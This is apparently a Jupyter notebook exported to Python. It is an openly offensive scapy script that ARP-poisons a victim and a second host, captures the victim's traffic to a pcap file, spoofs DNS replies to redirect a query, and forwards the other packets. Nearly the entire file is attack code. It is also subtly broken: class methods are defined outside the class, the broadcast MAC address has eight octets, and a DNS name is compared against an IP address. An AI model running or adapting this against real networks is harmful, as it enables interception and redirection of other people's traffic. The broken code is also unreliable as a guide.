#!/usr/bin/env python
# coding: utf-8

# In[ ]:


from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, DNS, DNSQR, DNSRR, IP, UDP, sendp
import os
import sys
import time


# In[ ]:


def get_macaddress(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    ans, unans = srp(packet, timeout=2, retry=10, verbose=False)
    for unans, r in ans:
        return r[Ether].src
    return None


# In[ ]:


class Arppoisoner():
    def __init__(self, victim, m2, interface="eth0"):
        self.victim = victim
        self.victimMac = get_macaddress(victim)
        self.m2 = m2
        self.m2Mac = get_macaddress(m2)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}.')
        print(f'm2({m2}) is at {self.m2Mac}.')
        print(f'Victim ({victim}) is at {self.victimMac}.')
        print('-'*30)


# In[ ]:


def run(self):
    self.poison_thread = Process(target=self.poison)
    self.poison_thread.start()

    self.sniff_thread = Process(target=self.sniff)
    self.sniff_thread.start()

    self.dns_spoof_thread = Process(target=self.dns_spoof)
    self.dns_spoof_thread.start()
    
    forwarding_thread = Process(target=run_forwarding)
    forwarding_thread.start()


# In[ ]:


def poison(self):
    poison_victim = ARP()
    poison_victim.op = 2
    poison_victim.psrc = self.m2
    poison_victim.pdst = self.victim
    poison_victim.hwdst = self.victimMac

    print(f'ip src: {poison_victim.psrc}')
    print(f'ip dst: {poison_victim.pdst}')
    print(f'mac dst: {poison_victim.hwdst}')
    print(f'mac src: {poison_victim.hwsrc}')
    print(poison_victim.summary())
    print('-'*30)

    poison_m2 = ARP()
    poison_m2.op = 2
    poison_m2.psrc = self.victim
    poison_m2.pdst = self.m2
    poison_m2.hwdst = self.m2Mac

    print(f'ip src: {poison_m2.psrc}')
    print(f'ip dst: {poison_m2.pdst}')
    print(f'mac dst: {poison_m2.hwdst}')
    print(f'mac src: {poison_m2.hwsrc}')
    print(poison_m2.summary())
    print('-'*30)
    print(f'Beginning the ARP Poisoning. [CTRL-C to stop]')

    while True:
        sys.stdout.write('.')
        sys.stdout.flush()
        try:
            send(poison_victim)
            send(poison_m2)
        except KeyboardInterrupt:
            self.restore()
            sys.exit()
        else:
            time.sleep(2)


# In[ ]:


def sniff(self, count=1000):
    time.sleep(5)
    print(f'Sniffing {count} packets')
    bpf_filter = "ip host %s" % self.victim
    packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
    wrpcap('arper.pcap', packets)
    print('Got the packets')
    self.restore()
    self.poison_thread.terminate()
    print('Finished')


# In[ ]:


def restore(self):
    print('Restoring ARP tables...')
    send(ARP(
        op=2,
        psrc=self.m2,
        hwsrc=self.m2Mac,
        pdst=self.victim,
        hwdst='ff:ff:ff:ff:ff:ff'), count=5)
    send(ARP(
        op=2,
        psrc=self.victim,
        hwsrc=self.victimMac,
        pdst=self.m2,
        hwdst='ff:ff:ff:ff:ff:ff'), count=5)


# In[ ]:


if __name__ == '__main__':
    (victim, m2, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arppoisoner(victim, m2, interface)
    myarp.run()


# In[ ]:


from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sendp

def dns_spoof(pkt):
    if (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0):  # DNS query
        original_pkt = pkt
        ip = pkt.getlayer(IP)
        udp = pkt.getlayer(UDP)
        dns = pkt.getlayer(DNS)

        if dns.qd.qname == b'192.168.56.102':  # If the query is for the domain to spoof
            spoofed_pkt = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata='192.168.1.100'))
            send(spoofed_pkt)
        else:  # For all other domains
            # Forward the original DNS query
            sendp(original_pkt)
    else:  # For all other packets
        # Forward the original packet
        sendp(pkt)


# In[ ]:


from multiprocessing import Process
from scapy.all import sniff, sendp

def forward_packets(pkt):
    # Forward the original packet
    sendp(pkt)

def run_forwarding():
    sniff(prn=forward_packets)

forwarding_thread = Process(target=run_forwarding)
forwarding_thread.start()

